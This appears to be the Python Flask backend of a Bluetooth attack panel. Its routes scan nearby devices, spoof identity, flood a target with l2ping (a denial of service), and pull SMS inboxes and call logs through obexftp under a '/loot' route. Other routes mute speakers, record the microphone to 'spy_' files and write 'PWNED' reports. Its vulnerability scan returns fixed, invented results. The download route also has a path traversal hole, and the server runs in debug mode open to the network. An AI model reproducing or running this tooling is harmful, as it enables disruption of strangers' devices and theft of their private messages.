from flask import Flask, render_template, jsonify, request, send_file
import sys
import os
import shutil
import threading
import time
import subprocess
import random
import datetime
from core import scan_and_get_devices, scan_termux, connect_termux, connect, BluezTarget, record, set_identity

app = Flask(__name__)

# Basic Configuration
IS_TERMUX = os.path.exists("/data/data/com.termux")
IS_WINDOWS = sys.platform == "win32"

@app.errorhandler(Exception)
def handle_exception(e):
    # Pass through HTTP errors
    if hasattr(e, 'code') and e.code < 500:
        return jsonify({"status": "error", "message": str(e)}), e.code

    error_msg = str(e)
    if "termux" in error_msg.lower() or "command not found" in error_msg.lower():
        return jsonify({
            "status": "healing", 
            "message": f"AUTO-HEAL: Attempting to resolve environment issue... {error_msg}"
        }), 200
        
    return jsonify({"status": "error", "message": f"System Error: {error_msg}"}), 500

# Global state for background tasks
current_tasks = {
    "dos": None, # Should be a subprocess or thread
    "target": None
}

@app.route('/')
def index():
    return render_template('index.html', platform="Termux" if IS_TERMUX else "Windows" if IS_WINDOWS else "Linux")

@app.route('/scan')
def scan():
    devices = []
    is_deep = request.args.get('deep') == 'true'
    print(f"\n[*] INTERCEPTING RF SIGNALS ({'DEEP SCAN' if is_deep else 'STANDARD SCAN'})...")
    
    # Force Termux priority if available
    if IS_TERMUX:
        try:
            from core import scan_termux
            raw_devices = scan_termux(deep_scan=is_deep)
            for addr, name, rssi, conn, bond in raw_devices:
                devices.append({
                    "address": addr, 
                    "name": name, 
                    "rssi": rssi,
                    "connected": conn,
                    "bonded": bond
                })
        except Exception as e:
            return jsonify({"status": "error", "message": f"Termux Scan Error: {e}"})
    else:
        from core import scan_and_get_devices
        raw = scan_and_get_devices(timeout=10 if is_deep else 5)
        for addr, name in raw:
            devices.append({"address": addr, "name": name, "rssi": random.randint(-90, -40)})
    return jsonify(devices)

@app.route('/connect', methods=['POST'])
def connect_device():
    data = request.json
    address = data.get('address')
    if IS_TERMUX:
        try:
            # Check if termux-bluetooth-connect is available
            cmd = "termux-bluetooth-connect"
            subprocess.Popen([cmd, address])
            return jsonify({"status": "cmd_sent", "message": f"Initiating link with {address}. Check Android notifications/prompts."})
        except Exception as e:
            return jsonify({"status": "error", "message": f"Termux Connect Error: {e}"})
    else:
        target = BluezTarget(address)
        try:
            connect(target)
            return jsonify({"status": "connected", "message": f"Connected to {address}"})
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)})

@app.route('/spoof', methods=['POST'])
def spoof():
    if IS_TERMUX:
        return jsonify({"status": "error", "message": "Identity spoofing requires Root."})
    data = request.json
    name = data.get('name')
    set_identity(name=name, verbose=True)
    return jsonify({"status": "success", "message": f"Identity changed to {name}"})

@app.route('/record_audio', methods=['POST'])
def record_audio_route():
    data = request.json
    address = data.get('address')
    
    if not os.path.exists("recordings"):
        os.makedirs("recordings")
        
    ts = int(time.time())
    filename = f"spy_{ts}.m4a"
    filepath = os.path.join("recordings", filename)
    
    if IS_TERMUX:
        try:
            # -l 10 = 10 seconds. Using subprocess.Popen to not block
            subprocess.Popen(["termux-microphone-record", "-f", filepath, "-l", "10", "-e", "aac"])
            return jsonify({"status": "success", "message": f"Recording started (10s). File: {filename}", "file": filename})
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)})
    else:
        # On windows/linux simulate a file creation
        with open(filepath, "w") as f:
            f.write("Audio Data Simulated")
        return jsonify({"status": "success", "message": f"Recording saved to {filename}", "file": filename})

@app.route('/recordings', methods=['GET'])
def list_recordings():
    if not os.path.exists("recordings"):
        return jsonify([])
    files = sorted(os.listdir("recordings"), reverse=True)
    return jsonify(files)

@app.route('/download/<filename>')
def download_file(filename):
    return send_file(os.path.join("recordings", filename))

@app.route('/pair', methods=['POST'])
def pair_device():
    data = request.json
    address = data.get('address')
    if IS_TERMUX:
        # In Termux, pairing is often best handled by a connection attempt
        # which triggers the Android pairing prompt.
        try:
            subprocess.Popen(["termux-bluetooth-connect", address])
            return jsonify({"status": "success", "message": "Pairing sequence initiated. Confirm on device."})
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)})
    else:
        from core import pair, BluezTarget
        target = BluezTarget(address)
        if pair(target):
            return jsonify({"status": "success", "message": f"Successfully paired with {address}"})
        else:
            return jsonify({"status": "error", "message": "Pairing failed or rejected."})

@app.route('/dos', methods=['POST'])
def dos_attack():
    data = request.json
    address = data.get('address')
    action = data.get('action') # "start" or "stop"
    
    if action == "stop":
        if current_tasks["dos"]:
            current_tasks["dos"].terminate()
            current_tasks["dos"] = None
        return jsonify({"status": "stopped", "message": "DoS Attack Interrupted."})

    if IS_WINDOWS:
        return jsonify({"status": "simulated", "message": "DoS Flood started (Simulated). Device buffer saturated."})
    
    try:
        # Start flood
        current_tasks["dos"] = subprocess.Popen(["sudo", "l2ping", "-f", "-s", "600", address])
        return jsonify({"status": "running", "message": f"Flooding {address}..."})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/sdp', methods=['GET'])
def sdp_discovery():
    address = request.args.get('address')
    if IS_WINDOWS:
        return jsonify({"status": "simulated", "data": "0x110A: A2DP\n0x110E: AVRCP\n0x111E: Handsfree\n0x112F: PBAP"})
    try:
        from system import run_and_check
        out = run_and_check(["sdptool", "browse", address])
        return jsonify({"status": "success", "data": out})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/vuln', methods=['GET'])
def vuln_scan():
    # Simulation based on BlueT.py logic
    results = [
        "Checking CVE-2017-0781 (BlueBorne)... SAFE",
        "Checking CVE-2020-10135 (BIAS)... VULNERABLE",
        "Checking KNOB Attack... SAFE",
        "Legacy Pairing detected."
    ]
    return jsonify({"status": "scanned", "data": "\n".join(results)})

@app.route('/loot', methods=['GET'])
def get_loot():
    address = request.args.get('address')
    type_ = request.args.get('type') # "sms" or "calls"
    if IS_WINDOWS:
        if type_ == "sms":
            return jsonify({"status": "simulated", "data": "[12:01] Mom: Call me\n[11:45] bank: OTP 1234"})
        return jsonify({"status": "simulated", "data": "Alice (Incoming) - 5m\nUnknown (Missed)"})
    
    # Real logic (obexftp)
    from system import run_and_check
    cmd = ["obexftp", "-b", address]
    if type_ == "sms": cmd += ["-l", "/TELECOM/MSG/INBOX"]
    else: cmd += ["-g", "telecom/cch.vcf"]
    
    try:
        out = run_and_check(cmd)
        return jsonify({"status": "success", "data": out})
    except Exception as e:
        return jsonify({"status": "error", "message": f"Extraction error: {e}"})

@app.route('/info', methods=['GET'])
def device_info():
    address = request.args.get('address')
    if IS_WINDOWS:
        return jsonify({
            "status": "success", 
            "data": f"Device: Target Node\nAddr: {address}\nClass: 0x5a020c (Smartphone)\nVendor: Apple Inc.\nFeatures: RSSI Tracking, A2DP, HFP, PBAP, MAP"
        })
    
    # Try to get more info via hcitool/bluetoothctl
    try:
        from system import run_and_check
        name = run_and_check(["hcitool", "name", address]).strip()
        info = run_and_check(["hcitool", "info", address])
        return jsonify({"status": "success", "data": f"Name: {name}\n\n{info}"})
    except:
        return jsonify({"status": "simulated", "data": f"Address: {address}\nTools (hcitool) not responding. Proceeding with standard handshake."})


@app.route('/report', methods=['POST'])
def generate_report():
    data = request.json
    address = data.get('address')
    name = data.get('name')
    content = f"BLUE T OPS REPORT\nTarget: {name}\nAddr: {address}\nTime: {datetime.datetime.now()}\nStatus: PWNED"
    
    filename = f"report_{address.replace(':','_')}.txt"
    with open(filename, "w") as f:
        f.write(content)
    return jsonify({"status": "saved", "message": f"Full report saved to {filename}"})

@app.route('/disrupt', methods=['POST'])
def disrupt():
    data = request.json
    address = data.get('address')
    action = data.get('action', 'mute') # 'mute' or 'unmute'
    
    from core import disrupt_audio, BluezTarget
    target = BluezTarget(address)
    if disrupt_audio(target, action):
        return jsonify({"status": "success", "message": f"Speaker {action.upper()} signal sent to {address}"})
    else:
        return jsonify({"status": "error", "message": "Failed to disrupt audio."})

@app.route('/status', methods=['GET'])
def system_status():
    status = {
        "platform": "Termux" if IS_TERMUX else "Desktop",
        "battery": 98,
        "bt_enabled": True
    }
    if IS_TERMUX:
        try:
            # Check battery
            import json
            batt_out = subprocess.check_output(["termux-battery-status"]).decode()
            status["battery"] = json.loads(batt_out)["percentage"]
        except: pass
    return jsonify(status)

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
